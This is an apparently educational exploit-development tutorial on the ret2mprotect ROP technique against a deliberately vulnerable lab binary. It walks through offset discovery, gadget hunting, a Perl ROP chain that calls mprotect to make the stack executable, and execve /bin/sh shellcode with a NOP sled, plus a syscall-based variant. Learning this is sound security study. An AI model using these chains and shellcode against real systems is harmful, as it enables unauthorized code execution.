## Ret2mprotect
### What is ret2mproctect
The mprotect() function is used to change the access protection of a memory mapping to that specified by protection. All whole pages of the process's address space, that were established by the mmap() function, addressed from addr continuing for a length of len will be affected by the change of access protection.Thansk to sys_mprotect we will be able to make the stack executable again. it means that we will be able to inject shellcode on the stack and execute it. 

### Why use the ret2mprotect technique when you can do a ret2libc
First of all, the ret2mprotect function is way easier to use comparing to a ret2libc and can be use wheter the binary is statically linked or dynamically linked. Yeah, if the binary is statically linked you won't be able to do ret2libc since there is no libc which is logic.

### Practice
You can found the file [here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/vuln.c). To compile the binary use this command. 
```bash
└─# gcc vuln.c -o vuln -fno-stack-protector -no-pie -static
```` 

##### File and Security

Only NX is enabled.NX or DEP (In Windows) is a protection really important for your binaries. It will "says to the stack to don't execute what there is in". So the stack will "refuse" to execute code on the stack. So we won't be able to inject a shellcode in it. It's why the Return Oriented Programming technique is really important because it will allow you to bypass this annoying protection in different ways. But you will see that we can make this stack executable again thanks to the ret2mprotect technique.

```bash
$ file vuln3
vuln3: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=69fab13311a314003a7c3c704ca004b97e435ece, for GNU/Linux 3.2.0, not stripped
```
As you can see the file is statically linked, so there is no libc, and the ret2libc technique to bypass NX/DEP can't be use. 
![image](https://user-images.githubusercontent.com/87600765/175769784-23b6c122-ae75-4bc1-a985-f6c275f334a8.png)

### Offset
First of all we need to know the amount of bytes we need before overwrite RIP (Instruction Pointer) to overflow the binary and then exploit it. For this I 'am gonna use gef. I will create a pattern of 300 bytes, then I am gonna send it.

![image](https://user-images.githubusercontent.com/87600765/175768531-07bfde79-238b-40b5-b934-aedeaf60df87.png)

The program is receiving a segfault:
![image](https://user-images.githubusercontent.com/87600765/175768551-50c6a42e-ed25-41ce-8b66-ad9aea09ff9c.png)

To know the rip value during the segfault, we do an `info frame`.

![image](https://user-images.githubusercontent.com/87600765/175768719-18a78ced-dba0-4dde-bb48-b2968986b418.png)

You can see that the binary receives a segfault because the address of rip was overwritten so the address in it is an address that doesn't exist so the program doesn't know where to go and crashes. Now let's take a look at the saved rip. saved rip is the return address so it's a callee saved register. Across calls, these registers have to have a preserved value. To saved this register the program pushes it on the stack, then the call is down and then it pops it from the stack. So right now we want the value of the saved rip register with the pattern that we sent. For this we can do an info frame. This command allows us to have information about the stack frame. As you know the stack frame is used for storing local functions variables and context during function calls. In this case the rip is stored on this stack frame because during functions call the value in rip can change.

**Stack frame**:

stack level 0 = frame number in backtrace, 0 is the currently executing frame, which grows downwards, which is how the stack grows.
frame at `0x7fffffffe3f8` = It's the starting memory address of this stack frame. 
rip = `0x401e15` in main; saved rip = `0x626161616161616b`(overflowed by the padding) = RIP which is the instruction pointer points to the next instruction to execute. In this case, the next instruction is at `0x401e15`. For the saved rip is the explanation is right above.
Arglist at `0x7fffffffe3f0`, args = It's the starting address of the arguments. 
Locals at `0x7fffffffe3f0` = It's the address of local variables.
Previous frame's sp is `0x7fffffffe400` = It is where the previous frame´s stack pointer points to (the caller frame), at the moment of calling, it is also the starting memory address of called stack frame.

Then we just need to use `pattern offset`.

![image](https://user-images.githubusercontent.com/87600765/175770504-05d09791-3e7e-4c55-989a-61016a8ef5cc.png)

it means that we need 280 bytes before reaching rip. So if we send 288 bytes the last 8 bytes will be in rip.

### Mprotect
Mprotect requires 3 arguments: 
```c
#include <sys/mman.h>**

int mprotect(void ***_addr_**, size_t** _len_**, int** _prot_**);
```
We need the address of the mapped region, the lenght of memory to change and `0x7 `(PROT_READ|PROT_WRITE|PROT_EXEC). `0x7`, is the value to make the stack readable, writable and executable `rwx`. The address of the mapped region will be in rdi, the size of the stack will be in rsi and the `0x7` will be in rdx. Then we will need to put the address of mprotect to call the function mprotect and makle the stack executable. 

### Gadgets

So we need gadgets which `pop` value from the stack to put the values on rdi, rsi and rdx and ending with a ret value (ret is the equivalent of `pop rip`). To find gadgets I am using the ropper tool. 

![image](https://user-images.githubusercontent.com/87600765/175770302-51fb9f3d-2f61-4f54-b972-cd440bc5d624.png)

```md
pop_rdi = 0x00000000004018ca
pop_rdx = 0x00000000004017cf
pop_rsi = 0x000000000040f44e
```

We can start our exploit that I will do in perl and python
```perl
#!/usr/bin/perl

$| = 1;
$offset = "A"*280
$pop_rdi = pack("Q", 0x00000000004018ca);
$pop_rsi = pack("Q", 0x000000000040f44e);
$pop_rdx = pack("Q", 0x00000000004017cf);
```

### Arguments for mprotect
For the first argument we need the start address of the stack (the address of the mapped region). For this we can use `vmmap` or `info proc mapping`.

![image](https://user-images.githubusercontent.com/87600765/175770691-d97c504a-0f9c-491e-b4e0-ce2ef86b7066.png)

So the start address of the stack is `0x00007ffffffde000` and because of NX enabled the Perm is only `rw-`.
Now we need a size. This lenght will be affected by the mprotect when we will call it. Personally I will use the entire size of the stack which is `0x21000`.

![image](https://user-images.githubusercontent.com/87600765/175770908-0382c00b-03b3-46fa-874a-352e256c45b9.png)

Now we need the address of mprotect. `xinfo mprotect`.

![image](https://user-images.githubusercontent.com/87600765/175772148-454bd2ea-0ed8-416c-8a10-f1b05df42deb.png)

Ok we can now complete our exploit. 
```perl
#!/usr/bin/perl

$| = 1;
$offset = "A"*280
$pop_rdi = pack("Q", 0x00000000004018ca);
$pop_rsi = pack("Q", 0x000000000040f44e);
$pop_rdx = pack("Q", 0x00000000004017cf);
$stack_address = pack("Q", 0x00007ffffffde000);
$stack_size = pack("Q", 0x21000);
$rwx = pack("Q", 0x7);
$mprotect = pack("Q", 0x451bf0);
```
### Shellcode

Since we can make the stack executable we can use a simple shellcode from shellstorm to have a shell. it means also that we need to use some nops value before the shellcode and we will need to substract the nops and the shellcode from the initial offset. The size of our shellcode is 30 bytes and we will use 100 bytes of NOPS. 
```md
offset = 280 - 30 - 100 = 150 bytes
```
So to call mprotect we need to have the address of the mapped region on `rdi`, the `0x7` value for `rwx` on `rdx`, the size of the stack on `rsi`. After that we put the address of mprotect to call the function mprotect. Basically since there is a `ret` after each gadgets, when the 3 arguments will be `pop` there will have a ret acally there is a `ret` after each gadgets of our rop chain. After our 3 arguments there is the address of mprotect. Since there is a ret after each gadgets the mprotect address will be pop on rip so rip will point to the address of mprotect so call it. After that the stack will be executable, writable and readable and we will need to put the shellcode return address to have our shell.
```perl
#!/usr/bin/perl

$| = 1;
#$offset = "A" x 280
$pop_rdi = pack("Q", 0x00000000004018ca);
$pop_rsi = pack("Q", 0x000000000040f44e);
$pop_rdx = pack("Q", 0x00000000004017cf);
$stack_address = pack("Q", 0x00007ffffffde000);
$stack_size = pack("Q", 0x21000);
$rwx = pack("Q", 0x7);
$mprotect = pack("Q", 0x451bf0);
$nops = "\x90" x 100;
$shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
# https://shell-storm.org/shellcode/files/shellcode-603.php
$offset  = "A" x 150;

print $nops . $shellcode . $offset . $pop_rdi . $stack_address . $pop_rsi . $stack_size . $pop_rdx . $rwx . $mprotect;
```
### Stack is rwx ?

Before choosing a return address for our shellcode I wanted to show you how our payload behaves with the binary during calling mprotect. I will open gdb, and put a breakpoint at main. The I am gonna run the program with the payload (`./vuln.pl > payload` to create the payload) and put a second break point at the ret address. After I will put `c` for continuing and `si` for a single instruction at machine level.

![image](https://user-images.githubusercontent.com/87600765/175805188-b4fda3ad-27e9-4061-9ad5-f92df1c8fd26.png)

![image](https://user-images.githubusercontent.com/87600765/175778650-bce0a1a5-a8fa-40ca-b189-58e91875e35c.png)

![image](https://user-images.githubusercontent.com/87600765/175778681-ad3ea499-fe46-4246-a078-6cf084e70197.png)

![image](https://user-images.githubusercontent.com/87600765/175778696-208e40cf-f211-49a7-b548-a1e930f60796.png)

As you can see there is our payload then I just put `si` and press enter. So you will see the values from the stack beinng pop in our registers.

![image](https://user-images.githubusercontent.com/87600765/175778778-32d79993-6d50-4633-b375-8c2d99951668.png)

![image](https://user-images.githubusercontent.com/87600765/175778809-bb0e528a-bad2-4c5c-b1ed-f21a70620258.png)

So as I said, the ret is about to be executed. So there will have a pop rip and the mprotect function will be call. So I press enter again.

![image](https://user-images.githubusercontent.com/87600765/175778897-f3476bb7-fd21-40d4-882a-0c8dac6141f0.png)

Now the address of mprotect is in rip and the function mprotect was called. but if you do a vmmap the stack isn't executable yet because the function called isn't finish. We need to pass the syscall before the stack is executable.

![image](https://user-images.githubusercontent.com/87600765/175778966-23c63176-fe2e-4eb5-8cd5-d30c650cf275.png)

We are about to execute syscall. 

![image](https://user-images.githubusercontent.com/87600765/175779011-aa5a1081-933f-48fe-a34e-e75edb8c6448.png)

As you can see we execute the syscall is now executable. MAGIC !. Our shellcode can be called and can be executed on the stack

### Return address 

We need our return address now. I will execute `x/50gx $rsp-340` for it or whatever you want. I amm gonna use this address for the return address.

![image](https://user-images.githubusercontent.com/87600765/175782131-0362a2a1-1019-4743-adcd-26facc1a6f6b.png)

Our final exploit is [here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit.pl) and [here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit.py) you can have a python exploit version with pwntools.

If we run the program:

![image](https://user-images.githubusercontent.com/87600765/175782230-26f0e762-6de6-412d-b461-d9d53ef55db2.png)

## 2nd method to do a ret2mprotect

Actually we call mprotect using 3 arguments and then thx to the ret the address of mprotect is pop on rip so the function is called but there is actually another way when we can simply use the syscall table and call mprotect. We will need more gadgets but I guess it's fine to know different ways to do one technique. Also you learn how to use gadgets.

I am using this syscall table which have a lot of tables for different architectures. https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md

![image](https://user-images.githubusercontent.com/87600765/175783213-6f185784-6658-4998-bb81-b3ad7397ce40.png)

So for use the sys_mprotect we need to have `0xa` in `rax`, the address of the mapped region in `rdi`, the size in `rsi` and `0x7` in rdx. So this time we don't need the address of mprotect since we are doing a sys_mprotect. 

### Gadgets

We already have the address of pop rdi, rsi and rdx. Now we need a gadget with a syscall and pop rax.

![image](https://user-images.githubusercontent.com/87600765/175783780-d24d376c-6982-4ebb-962c-a8e4f4cc378a.png)

```md
pop_rdi = 0x00000000004018ca
pop_rdx = 0x00000000004017cf
pop_rsi = 0x000000000040f44e
pop_rax = 0x0000000000451857
syscall = 0x000000000041e0d4
```

We have now all the gadgets that we want. For now I will use the same exploit but just modify it a little bit. So this is the [final exploit](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit2.pl).

### Issues !

Then let's see if it makes the stack executable. Let's run the program in gdb with the payload

![image](https://user-images.githubusercontent.com/87600765/175784739-e668c32b-cc6c-4120-bf38-1c625cb561c3.png)

Wait what ! It doesn't work. let's debug what is happening with gdb. We break main and run the program and then put a breakpoint at ret like last time. 

![image](https://user-images.githubusercontent.com/87600765/175784221-b99ab1a6-23f0-41c9-a3a5-78fada164d95.png)

OK we see the pop rax. Let's continue. After the `pop rax` our payload is done 

![image](https://user-images.githubusercontent.com/87600765/175784263-f184f5ab-2e1b-463d-9f62-43b81aea39a6.png)

And then the program has a segfault but our ropchain wasn't finish. 

![image](https://user-images.githubusercontent.com/87600765/175784288-5cbf5749-7f3a-49d2-aea0-91c948e8e0c6.png)

So what happened ? If you look at the ASCII table and the value A (which is the value that we need to put in `rax`) is the value for the new line feed.

![image](https://user-images.githubusercontent.com/87600765/175784357-ae01adc2-91fe-41ec-bcea-2b7b9c37d329.png)

And this is because of this new line feed that our ropchain stop because when the gets() function receive a new line feed it stops. If for example you run the binary and wehn it ask for the name and you press enter (so for a new line) gets stops. We need to bypass this. Actually we can send a wrong value to rax and then add a value to have 0xa in rax. For example we can put 0x9 in rax and then add 1 to rax to have 0xa. Let's search for this kind of thing with ropper.

![image](https://user-images.githubusercontent.com/87600765/175784520-e35245a9-e6a0-40a3-bb6d-627ae3edcce4.png)

Actually you can use this 3 gadgets but you will need to substract the initial value with the value added by the gadget. In this case we can simply use this `add rax, 1 ; ret`. So `0xa` - 1 = `0x9`

### Fixes

So instead put the value of `0xa` in `rax` we will put `0x9` and then add 1 to `rax` so let's modify our exploit. [Here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit2-fixed.pl) is the final exploit. So let's examine what finally happened. 

As you can see we are about to execute our add rax 1 and `0x9` was popped to rax. 

![image](https://user-images.githubusercontent.com/87600765/175785943-c0ebf7b9-0be4-4b85-8417-79437e387a42.png)
![image](https://user-images.githubusercontent.com/87600765/175786039-e2a32f2a-39f7-4291-84c6-1a68026eedc9.png)

And after the add rax 1 there is `0xa` in rax as we want and our rop chain is continuing as expected and wanted.

![image](https://user-images.githubusercontent.com/87600765/175786081-3f5237c7-2f25-4572-bbe9-57139dd0f5f4.png)

After the syscall, the stack is executable and our new exploit works.

![image](https://user-images.githubusercontent.com/87600765/175786120-4fd1e0e8-9f83-4ed9-8583-2bf6e1ed8b6b.png)

And [here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit2.py) a python version with pwntools. 
